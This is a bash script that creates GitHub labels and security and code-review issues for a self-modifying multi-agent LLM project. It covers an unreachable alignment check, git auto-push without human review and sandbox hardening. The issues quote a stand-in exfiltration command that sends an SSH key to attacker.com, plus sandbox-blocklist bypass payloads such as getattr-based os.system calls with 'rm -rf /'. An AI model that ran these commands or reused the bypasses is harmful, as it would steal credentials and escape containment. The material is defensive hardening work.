#!/bin/bash
# =============================================================================
# GitHub Issues Creator for Autonomous Agent Council
# Run this after authenticating with: gh auth login
# Usage: bash scripts/create_github_issues.sh
# =============================================================================

REPO="martinsharkey/autonomousagent"

echo "=== Setting up GitHub Labels ==="

# Priority labels
gh label create "priority: critical" --color "B60205" --description "Must fix immediately - system broken or security risk" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "priority: high" --color "D93F0B" --description "Fix before next release" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "priority: medium" --color "FBCA04" --description "Should fix soon" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "priority: low" --color "0E8A16" --description "Nice to have" --repo "$REPO" 2>/dev/null || echo "  (label exists)"

# Category labels
gh label create "bug" --color "D73A4A" --description "Something isn't working" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "security" --color "E11D48" --description "Security vulnerability or hardening" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "code-quality" --color "7057FF" --description "Refactoring, cleanup, best practices" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "testing" --color "0075CA" --description "Test coverage and quality" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "performance" --color "F9D0C4" --description "Performance improvement" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "enhancement" --color "A2EEEF" --description "New feature or improvement" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "documentation" --color "0075CA" --description "Documentation improvements" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "devops" --color "006B75" --description "CI/CD, deployment, infrastructure" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "roadmap" --color "5319E7" --description "Strategic roadmap item" --repo "$REPO" 2>/dev/null || echo "  (label exists)"

# Component labels
gh label create "component: core" --color "C5DEF5" --description "core/ module" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "component: governance" --color "C5DEF5" --description "governance/ module" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "component: agents" --color "C5DEF5" --description "agents/ module" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "component: evolution" --color "C5DEF5" --description "Self-evolution system" --repo "$REPO" 2>/dev/null || echo "  (label exists)"
gh label create "component: sandbox" --color "C5DEF5" --description "Code execution sandbox" --repo "$REPO" 2>/dev/null || echo "  (label exists)"

echo ""
echo "=== Creating Milestones ==="

gh api repos/$REPO/milestones -f title="v0.2 - Critical Fixes" -f description="Fix all critical bugs and security vulnerabilities" -f state="open" 2>/dev/null || echo "  (milestone exists)"
gh api repos/$REPO/milestones -f title="v0.3 - Hardening" -f description="Code quality, testing, and performance improvements" -f state="open" 2>/dev/null || echo "  (milestone exists)"
gh api repos/$REPO/milestones -f title="v1.0 - Production Ready" -f description="Full production hardening and deployment" -f state="open" 2>/dev/null || echo "  (milestone exists)"

echo ""
echo "=== Creating Issues ==="

# ─────────────────────────────────────────────────────────────────────────────
# CRITICAL BUGS
# ─────────────────────────────────────────────────────────────────────────────

gh issue create --repo "$REPO" \
  --title "🐛 [CRITICAL] Unreachable mission alignment check in mutation_proposer.py" \
  --label "bug,priority: critical,component: evolution" \
  --body '## Context
The mission alignment check in `core/mutation_proposer.py` is placed **after** the function has already returned, making it completely unreachable. This means mutations are NEVER validated against mission pillars before being proposed.

## Location
`core/mutation_proposer.py` — end of `propose_mutation()` function

## Problem
```python
        return proposal  # ← Function returns here

    except Exception as exc:
        ...
        return None

    # NEW: Mission Governor alignment check  ← UNREACHABLE CODE
    try:
        from core.mission_governor import is_mission_aligned, get_mission_pillar
        if not is_mission_aligned(proposal):
            ...
```

## Expected Fix
Move the mission alignment check BEFORE the final `return proposal` statement, after validation and deduplication:

```python
    # Mission Governor alignment check (move BEFORE return)
    try:
        from core.mission_governor import is_mission_aligned, get_mission_pillar
        if not is_mission_aligned(proposal):
            desc = proposal.get("description", "")
            print(f"[PROPOSER] Rejected non-aligned proposal: {desc[:80]}")
            return None
        proposal.setdefault("mission_pillar", get_mission_pillar(proposal))
    except Exception as exc:
        print(f"[PROPOSER] Mission alignment check error: {exc}")

    return proposal  # ← Move return to after the check
```

## Acceptance Criteria
- [ ] Mission alignment check executes before proposals are returned
- [ ] Unit test confirms non-aligned proposals are rejected
- [ ] Existing tests still pass'

gh issue create --repo "$REPO" \
  --title "🐛 [CRITICAL] TTL circuit breaker mismatch - code says 3, docs say 5" \
  --label "bug,priority: critical,component: core" \
  --body '## Context
The deterministic router in `core/graph.py` terminates at `loop_count >= 3`, but README.md and architecture docs state the TTL is 5. This causes premature task termination.

## Location
`core/graph.py` line 15

## Problem
```python
def deterministic_router(state: AgentState) -> str:
    if state["loop_count"] >= 3:  # Code says 3
```

README says:
> TTL Circuit Breaker (loop_count >= 5)

## Expected Fix
Decide on the correct value and align code + docs. Recommendation: use 5 as the TTL (or make it configurable via env var):

```python
TTL_LIMIT = int(os.getenv("COUNCIL_TTL_LIMIT", "5"))

def deterministic_router(state: AgentState) -> str:
    if state["loop_count"] >= TTL_LIMIT:
```

## Acceptance Criteria
- [ ] Code and documentation agree on TTL value
- [ ] TTL is configurable via environment variable
- [ ] Integration test verifies the correct TTL limit'

gh issue create --repo "$REPO" \
  --title "🐛 [CRITICAL] Duplicate YAML key in docker-compose.sandbox.yml silently drops tmpfs mount" \
  --label "bug,priority: critical,devops,component: sandbox" \
  --body '## Context
The `docker-compose.sandbox.yml` has a duplicate `tmpfs` key. YAML only keeps the last value, so the first `/tmp` mount is silently lost.

## Location
`docker-compose.sandbox.yml`

## Problem
```yaml
services:
  sandbox:
    tmpfs:
      - /tmp:suid,noexec,nodev          # ← THIS IS DROPPED
    tmpfs:                                # ← Duplicate key overwrites
      - /tmp/sandbox_workspace:suid,noexec,nodev
```

## Expected Fix
Merge into a single `tmpfs` key:
```yaml
services:
  sandbox:
    tmpfs:
      - /tmp:noexec,nodev,size=64m
      - /tmp/sandbox_workspace:noexec,nodev,size=64m
```

Note: Also removed `suid` flag which is inappropriate for a sandbox (should be `nosuid`).

## Acceptance Criteria
- [ ] Single `tmpfs` key with both mount points
- [ ] `docker compose config` validates without warnings
- [ ] Sandbox container has both tmpfs mounts when run'

# ─────────────────────────────────────────────────────────────────────────────
# HIGH PRIORITY - SECURITY
# ─────────────────────────────────────────────────────────────────────────────

gh issue create --repo "$REPO" \
  --title "🔒 [HIGH] Shell injection vulnerability in sandbox subprocess fallback" \
  --label "security,priority: high,component: sandbox" \
  --body '## Context
When Docker is unavailable and `SANDBOX_MODE=developer-unsafe`, the sandbox executes LLM-generated commands with `shell=True`, enabling shell injection.

## Location
`core/sandbox.py` — `_execute_in_subprocess_sandbox()` (line ~68)

## Problem
```python
def _execute_in_subprocess_sandbox(command: str, timeout: int) -> str:
    result = subprocess.run(
        command,
        shell=True,  # ← SHELL INJECTION
        ...
    )
```

An LLM could generate: `echo hello; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)`

## Expected Fix
Option A (recommended): Remove subprocess fallback entirely in production
```python
def execute_in_sandbox(command: str, timeout: int = SANDBOX_TIMEOUT, allow_unsafe: bool = False) -> str:
    if _is_docker_available():
        return _execute_in_docker_sandbox(command, timeout)
    else:
        return "ERROR: Docker required for sandbox execution. Install Docker to continue."
```

Option B: If dev fallback must exist, parse into args list:
```python
import shlex
result = subprocess.run(
    shlex.split(command),  # No shell=True
    shell=False,
    ...
)
```

## Acceptance Criteria
- [ ] `shell=True` is never used with untrusted input
- [ ] Production mode ONLY uses Docker sandbox
- [ ] Dev mode logs a prominent warning and requires explicit opt-in
- [ ] Test verifies shell metacharacters are not executed'

gh issue create --repo "$REPO" \
  --title "🔒 [HIGH] Security validation blocklist is trivially bypassable" \
  --label "security,priority: high,component: sandbox" \
  --body '## Context
`validate_sandbox_security()` uses a string-matching blocklist that is trivially bypassed.

## Location
`core/sandbox.py` — `validate_sandbox_security()` (line ~145)

## Problem
Current blocklist:
```python
dangerous_patterns = [
    "__subclasses__", "__class__", "__base__",
    "os.system", "subprocess.call", "eval(", "exec(", "__import__"
]
```

Bypasses:
- `getattr(os, "system")("rm -rf /")` — not caught
- `subprocess.run(...)` — only `subprocess.call` is blocked
- `importlib.import_module("os")` — not caught  
- `__builtins__["eval"]` — not caught
- Base64-encoded payloads decoded at runtime

## Expected Fix
Replace string matching with AST-based analysis:

```python
import ast

def validate_sandbox_security(code: str) -> bool:
    """AST-based security validation."""
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return False  # Unparseable code is suspicious
    
    for node in ast.walk(tree):
        # Block dangerous imports
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in BLOCKED_MODULES:
                    return False
        if isinstance(node, ast.ImportFrom):
            if node.module in BLOCKED_MODULES:
                return False
        # Block exec/eval calls
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ("exec", "eval", "compile", "__import__"):
                    return False
            # Block getattr tricks
            if isinstance(node.func, ast.Attribute):
                if node.func.attr in ("system", "popen", "call", "run", "Popen"):
                    return False
    return True
```

## Acceptance Criteria
- [ ] AST-based validation replaces string matching
- [ ] Known bypass patterns are blocked (test each one)
- [ ] Legitimate code still passes validation
- [ ] Unit tests cover at least 10 bypass patterns'

gh issue create --repo "$REPO" \
  --title "🔒 [HIGH] Git auto-push allows autonomous code propagation without human review" \
  --label "security,priority: high,component: evolution" \
  --body '## Context
The evolution engine can automatically commit and push changes to the repository without human approval.

## Location
`core/evolution.py` — `auto_commit_roadmap()` method

## Problem
```python
def auto_commit_roadmap(self) -> None:
    subprocess.run(["git", "add", "MUTATIONS_ROADMAP.md"], check=True)
    subprocess.run(["git", "commit", "-m", "Auto-update MUTATIONS_ROADMAP.md"], check=True)
    subprocess.run(["git", "push"], check=True)  # ← Pushes without approval
```

Combined with file mutation capabilities, the system could theoretically propagate malicious or broken code.

## Expected Fix
1. Gate pushes behind operator approval (same as mutations)
2. Or push to a dedicated branch and create a PR for human review:

```python
def auto_commit_roadmap(self) -> None:
    branch = f"auto/roadmap-{datetime.utcnow().strftime('%Y%m%d-%H%M')}"
    subprocess.run(["git", "checkout", "-b", branch], check=True)
    subprocess.run(["git", "add", "MUTATIONS_ROADMAP.md"], check=True)
    subprocess.run(["git", "commit", "-m", "Auto-update MUTATIONS_ROADMAP.md"], check=True)
    subprocess.run(["git", "push", "--set-upstream", "origin", branch], check=True)
    subprocess.run(["git", "checkout", "main"], check=True)
    # Optionally create PR via gh CLI
```

## Acceptance Criteria
- [ ] No direct pushes to main/master from autonomous code
- [ ] Auto-changes go to a branch and/or PR
- [ ] Telegram notification sent when auto-commit occurs
- [ ] Operator can approve/reject via /approve command'

gh issue create --repo "$REPO" \
  --title "🔒 [HIGH] Docker sandbox runs as root inside container" \
  --label "security,priority: high,component: sandbox" \
  --body '## Context
The Docker sandbox commands in `core/sandbox.py` do not specify a non-root user, meaning code executes as root inside the container.

## Location
`core/sandbox.py` — `_execute_in_docker_sandbox()` and `_execute_python_in_docker()`

## Problem
```python
docker_cmd = [
    "docker", "run",
    "--name", container_name,
    "--rm",
    "--memory", SANDBOX_MEMORY_LIMIT,
    # ... no --user flag
]
```

## Expected Fix
Add `--user` flag:
```python
docker_cmd = [
    "docker", "run",
    "--name", container_name,
    "--rm",
    "--user", "1000:1000",  # Non-root user
    "--memory", SANDBOX_MEMORY_LIMIT,
    ...
]
```

Also update `Dockerfile.sandbox` to create a dedicated sandbox user (which it already does but the runtime command overrides it).

## Acceptance Criteria
- [ ] Both `_execute_in_docker_sandbox` and `_execute_python_in_docker` use `--user` flag
- [ ] `whoami` inside sandbox returns non-root user
- [ ] Existing sandbox tests pass with the non-root user'

# ─────────────────────────────────────────────────────────────────────────────
# MEDIUM PRIORITY - CODE QUALITY
# ─────────────────────────────────────────────────────────────────────────────

gh issue create --repo "$REPO" \
  --title "🔧 [MEDIUM] Replace all print() statements with structured logging" \
  --label "code-quality,priority: medium" \
  --body '## Context
The entire codebase uses `print()` for logging. This makes it impossible to filter by log level, route to files, or integrate with monitoring.

## Problem
~200+ `print()` calls throughout the codebase with no log levels.

## Expected Fix
1. Create a logging configuration module:
```python
# core/log_config.py
import logging
import sys

def setup_logging(level=logging.INFO):
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler("council.log")
        ]
    )

def get_logger(name: str) -> logging.Logger:
    return logging.getLogger(name)
```

2. Replace all `print(f"[AGENT]...")` with `logger.info(...)`, `logger.warning(...)`, etc.

## Acceptance Criteria
- [ ] All `print()` statements replaced with `logging` calls
- [ ] Log levels used appropriately (DEBUG, INFO, WARNING, ERROR)
- [ ] Logs can be filtered by module name
- [ ] Log output goes to both stdout and a file'

gh issue create --repo "$REPO" \
  --title "🔧 [MEDIUM] Fix _safe_run() async/sync bridging pattern" \
  --label "code-quality,priority: medium,component: agents" \
  --body '## Context
The `_safe_run()` function in `agents/autobot.py` uses a ThreadPoolExecutor to run async code from a sync context. This pattern can deadlock and is fragile.

## Location
`agents/autobot.py`

## Problem
```python
def _safe_run(coro):
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(coro)
    else:
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(asyncio.run, coro)
            return future.result(timeout=120)
```

Issues:
- Can deadlock if the thread pool is exhausted
- Creates a new event loop per call (expensive)
- 120s timeout is arbitrary and not configurable

## Expected Fix
Make the agent nodes fully async (LangGraph supports async nodes):

```python
async def autobot_node(state: AgentState):
    # Now can use await directly
    response = await _invoke_cloud(messages, "security_audit")
    ...
```

Or use `asyncio.run_coroutine_threadsafe()` with the existing loop.

## Acceptance Criteria
- [ ] Agent nodes are async-native OR use a safe bridging pattern
- [ ] No ThreadPoolExecutor workaround needed
- [ ] Timeout is configurable
- [ ] No deadlock risk under load'

gh issue create --repo "$REPO" \
  --title "🔧 [MEDIUM] Add dependency injection instead of module-level singletons" \
  --label "code-quality,priority: medium,component: core" \
  --body '## Context
Multiple modules use module-level mutable singletons without proper lifecycle management:

```python
_evolution_engine = None       # core/evolution.py
_global_governor = None        # core/governor.py  
_message_bus = None            # core/communication.py
_router_instance = None        # core/api_router.py
_council_loops = {}            # core/agent_loop.py
```

## Problem
- Makes testing difficult (need to reset global state between tests)
- Hidden coupling between modules
- No way to run isolated instances
- Thread safety issues (evolution engine has no locks)

## Expected Fix
Option A: Simple service container
```python
class ServiceContainer:
    def __init__(self):
        self.governor = ResourceGovernor()
        self.evolution = EvolutionEngine()
        self.message_bus = MessageBus()
        self.router = LLMProviderPool()
    
    @classmethod
    def create_default(cls):
        return cls()
    
    @classmethod  
    def create_for_testing(cls):
        # Returns container with mocked services
        ...
```

Option B: Constructor injection in classes that need dependencies.

## Acceptance Criteria
- [ ] At minimum, global singletons are resettable for tests
- [ ] EvolutionEngine has thread-safe access to shared state
- [ ] Tests can run in isolation without leaking state'

gh issue create --repo "$REPO" \
  --title "🔧 [MEDIUM] Duplicate import and dead code cleanup" \
  --label "code-quality,priority: medium" \
  --body '## Context
Several code quality issues scattered across the codebase.

## Issues to Fix

1. **Duplicate import** in `core/agent_loop.py`:
   - `import json` appears at both the top and bottom of the file

2. **Unreachable code** in `core/mutation_validator.py` (line ~60):
   ```python
   return (False, f"Critical file {path} requires human approval")
   return False, "Each file_change must be a dict"  # UNREACHABLE
   ```

3. **Typo in directory name**: `autobot genisis/` should be `autobot genesis/`

4. **Inconsistent Path handling**: Mix of `Path` objects and string concatenation for file paths

## Acceptance Criteria
- [ ] No duplicate imports (run `isort` and `flake8`)
- [ ] No unreachable code (run `flake8 --select=E501,W`)
- [ ] Directory renamed to fix typo
- [ ] Consistent use of `pathlib.Path` for file operations'

# ─────────────────────────────────────────────────────────────────────────────
# TESTING
# ─────────────────────────────────────────────────────────────────────────────

gh issue create --repo "$REPO" \
  --title "🧪 [HIGH] Add comprehensive EvolutionEngine test suite" \
  --label "testing,priority: high,component: evolution" \
  --body '## Context
The `EvolutionEngine` is the largest and most complex module (1,782 lines) but has NO dedicated test file. It handles the entire mutation lifecycle.

## What Needs Testing

1. **Mutation proposal lifecycle**: propose → validate → vote → approve/reject
2. **File mutation allowlist/denylist enforcement**
3. **Canary rollout state machine**: proposed → canary → rolling_out → complete/failed
4. **Soak testing**: mutations only promote after N successful cycles
5. **Deduplication**: same mutation not proposed twice
6. **Consensus voting**: unanimous approval required
7. **Rollback on failure**
8. **Resource impact calculation**
9. **Quality scoring**
10. **Roadmap generation**

## Expected Structure
```
tests/test_evolution_engine.py
├── TestMutationProposal
│   ├── test_propose_valid_mutation
│   ├── test_reject_invalid_mutation_type
│   ├── test_denylist_blocks_env_files
│   └── test_allowlist_permits_valid_paths
├── TestConsensusVoting
│   ├── test_unanimous_approval_promotes
│   ├── test_any_rejection_blocks
│   └── test_partial_votes_stay_pending
├── TestCanaryRollout
│   ├── test_rollout_state_transitions
│   ├── test_soak_cycle_counting
│   └── test_failed_rollout_triggers_rollback
└── TestEvolutionStats
    ├── test_stats_accuracy
    └── test_roadmap_generation
```

## Acceptance Criteria
- [ ] At least 20 test cases covering the mutation lifecycle
- [ ] Tests run without network access (mock LLM calls)
- [ ] Coverage of EvolutionEngine reaches 80%+
- [ ] Tests are deterministic (no timing-dependent assertions)'

gh issue create --repo "$REPO" \
  --title "🧪 [MEDIUM] Add security validation negative tests" \
  --label "testing,priority: medium,component: sandbox" \
  --body '## Context
There are almost no tests that verify dangerous code is actually BLOCKED by the security validation.

## Expected Tests
```python
class TestSecurityValidation:
    def test_blocks_os_system(self):
        assert validate_sandbox_security("os.system(\"rm -rf /\")") == False
    
    def test_blocks_subprocess_run(self):
        assert validate_sandbox_security("subprocess.run([\"ls\"])") == False
    
    def test_blocks_getattr_bypass(self):
        assert validate_sandbox_security("getattr(os, \"system\")(\"id\")") == False
    
    def test_blocks_import_bypass(self):
        assert validate_sandbox_security("importlib.import_module(\"os\")") == False
    
    def test_blocks_class_traversal(self):
        assert validate_sandbox_security("().__class__.__bases__[0].__subclasses__()") == False
    
    def test_allows_safe_code(self):
        assert validate_sandbox_security("x = 1 + 2\nprint(x)") == True
    
    def test_blocks_base64_exec(self):
        assert validate_sandbox_security("exec(base64.b64decode(\"...\"))") == False
```

## Acceptance Criteria
- [ ] At least 10 negative test cases for known bypass patterns
- [ ] Tests pass AFTER the AST-based validator is implemented
- [ ] Tests documented with the bypass technique they cover'

# ─────────────────────────────────────────────────────────────────────────────
# PERFORMANCE
# ─────────────────────────────────────────────────────────────────────────────

gh issue create --repo "$REPO" \
  --title "⚡ [MEDIUM] SQLite connection pooling for GoalStore" \
  --label "performance,priority: medium,component: core" \
  --body '## Context
The `GoalStore` in `core/goals.py` opens and closes a new SQLite connection on every single method call. At 300 cycles/hour this creates significant I/O overhead.

## Problem
```python
def get_goal(self, goal_id: str):
    conn = sqlite3.connect(self.db_path)  # New connection every call
    cursor = conn.cursor()
    cursor.execute(...)
    conn.close()  # Immediately closed
```

## Expected Fix
Use a persistent connection with WAL mode:
```python
class GoalStore:
    def __init__(self, db_path: str = "./goals/goals.db"):
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self._conn.execute("PRAGMA journal_mode=WAL")
        self._conn.execute("PRAGMA busy_timeout=5000")
        self._lock = threading.Lock()
        self._init_db()
    
    def _get_cursor(self):
        return self._conn.cursor()
```

## Acceptance Criteria
- [ ] Single persistent connection with WAL mode
- [ ] Thread-safe access via lock
- [ ] Connection auto-reconnects if dropped
- [ ] Performance improvement measurable (< 1ms per query)'

gh issue create --repo "$REPO" \
  --title "⚡ [MEDIUM] Add message cleanup daemon for communication bus" \
  --label "performance,priority: medium,component: core" \
  --body '## Context
Every inter-agent message creates a new JSON file in `messages/`. At 300 cycles/hour × 5 messages/cycle = 1,500 files/hour with no cleanup.

## Location
`core/communication.py` — `_persist_message()`

## Problem
The `messages/` directory will grow unbounded and eventually cause filesystem issues.

## Expected Fix
1. Add a cleanup method:
```python
def cleanup_old_messages(self, max_age_hours: int = 24):
    """Remove message files older than max_age_hours."""
    cutoff = datetime.utcnow() - timedelta(hours=max_age_hours)
    for msg_file in self.messages_dir.glob("msg_*.json"):
        if msg_file.stat().st_mtime < cutoff.timestamp():
            msg_file.unlink()
```

2. Call it periodically from the agent loop (e.g., every 100 cycles)

3. Consider using SQLite instead of individual JSON files for message persistence.

## Acceptance Criteria
- [ ] Old messages are cleaned up automatically
- [ ] Cleanup runs on a configurable schedule
- [ ] Message count stays bounded
- [ ] No data loss for messages < 24h old'

# ─────────────────────────────────────────────────────────────────────────────
# ROADMAP / ENHANCEMENTS
# ─────────────────────────────────────────────────────────────────────────────

gh issue create --repo "$REPO" \
  --title "🗺️ [ROADMAP] Add .env.example documenting all required environment variables" \
  --label "documentation,priority: medium,roadmap" \
  --body '## Context
The system requires many environment variables but no `.env.example` documents them.

## Required Variables (discovered from code review)
```bash
# Telegram
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# HMAC Keys (auto-generated if missing, but can be set)
AUDIT_LOG_HMAC_KEY=
SNAPSHOT_HMAC_KEY=
ZERO_TRUST_HMAC_KEY=
HMAC_SECRET_KEY=

# Ollama (local LLM)
OLLAMA_BASE_URL=http://localhost:11434
OLLAMA_MAX_LOADED_MODELS=1
OLLAMA_CTX_SIZE=2048

# Cloud Providers (from providers.yaml)
OPENROUTER_API_KEY=
GOOGLE_API_KEY=
TOGETHER_API_KEY=

# Sandbox
SANDBOX_MODE=production  # or developer-unsafe

# Council
COUNCIL_TTL_LIMIT=5
MUTATION_NOTIFY_PARAMS=false
```

## Acceptance Criteria
- [ ] `.env.example` exists in repo root
- [ ] All required variables are documented with descriptions
- [ ] README references the `.env.example`
- [ ] `.env` is in `.gitignore`'

gh issue create --repo "$REPO" \
  --title "🗺️ [ROADMAP] Implement GitHub Actions CI pipeline" \
  --label "devops,priority: medium,roadmap" \
  --body '## Context
No CI/CD pipeline exists. Tests must be run manually.

## Expected Implementation
Create `.github/workflows/ci.yml`:
```yaml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -r requirements.txt
      - run: pytest tests/ -v --cov=core --cov=agents --cov=governance
      - run: flake8 core/ agents/ tools/ governance/
      - run: black --check core/ agents/ tools/ governance/
```

## Acceptance Criteria
- [ ] CI runs on every push and PR
- [ ] Tests, linting, and formatting are checked
- [ ] Coverage report generated
- [ ] Badge added to README'

gh issue create --repo "$REPO" \
  --title "🗺️ [ROADMAP] Add Pydantic models for mutation and message validation" \
  --label "enhancement,priority: low,roadmap,component: core" \
  --body '## Context
Mutations and messages are passed as raw dicts throughout the codebase. This leads to runtime errors when keys are missing and makes the API implicit.

## Expected Fix
Replace raw dicts with Pydantic models:

```python
from pydantic import BaseModel, Field
from enum import Enum

class MutationType(str, Enum):
    BEHAVIOR_CHANGE = "behavior_change"
    PROMPT_OPTIMIZATION = "prompt_optimization"
    TOOL_ADDITION = "tool_addition"
    PARAMETER_ADJUSTMENT = "parameter_adjustment"
    STRATEGY_EVOLUTION = "strategy_evolution"

class FileChange(BaseModel):
    path: str
    kind: str = "create"  # create, modify, delete
    content: str = ""

class MutationProposal(BaseModel):
    agent_name: str
    mutation_type: MutationType
    description: str
    rationale: str
    proposed_changes: dict
    expected_improvement: float = Field(ge=0.0, le=1.0)
    risk_level: str = "medium"
    mission_pillar: int = Field(ge=1, le=5)
```

## Acceptance Criteria
- [ ] Core data structures use Pydantic models
- [ ] Invalid data is rejected at the boundary with clear errors
- [ ] Existing tests updated to use models
- [ ] API responses are properly typed'

echo ""
echo "=== Done! ==="
echo "All issues created. View them at: https://github.com/$REPO/issues"
echo ""
echo "Suggested workflow for your developer (Kilo Code):"
echo "1. Filter by 'priority: critical' label and fix those first"
echo "2. Then 'priority: high' security issues"
echo "3. Then 'priority: medium' improvements"
echo "4. Check off acceptance criteria as you go"
echo "5. Close issues with commit references"
